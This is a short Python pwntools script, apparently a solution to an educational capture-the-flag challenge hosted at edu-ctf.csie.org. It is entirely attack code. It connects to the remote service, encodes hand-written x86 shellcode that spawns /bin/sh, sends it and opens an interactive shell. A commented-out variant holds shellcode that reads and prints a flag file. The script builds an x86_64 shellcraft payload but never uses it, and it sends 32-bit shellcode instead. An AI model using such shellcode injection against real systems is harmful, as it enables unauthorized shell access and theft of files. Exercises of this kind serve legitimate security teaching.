import os
from pwn import *
rem = remote('edu-ctf.csie.org', 10150)
rem.recvuntil('shellcode >')

context.clear(arch='x86_64')
shellcode = asm(shellcraft.sh())
#avoid = "\x0f\x05\x00"
#encoded = pwnlib.encoders.encoder.encode(shellcode, avoid)
#print('shellcode is ', shellcode)
encoded = pwnlib.encoders.encoder.encode('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')
#encoded = pwnlib.encoders.encoder.encode('\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x66\x6c\x61\x67\x68\x30\x64\x65\x2f\x68\x65\x6c\x6c\x63\x68\x65\x2f\x73\x68\x68\x2f\x68\x6f\x6d\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x92\xb3\x01\xc1\xe8\x0a\xcd\x80\x93\xcd\x80')

print('encoded is ', encoded)
rem.sendline(encoded)
rem.interactive()
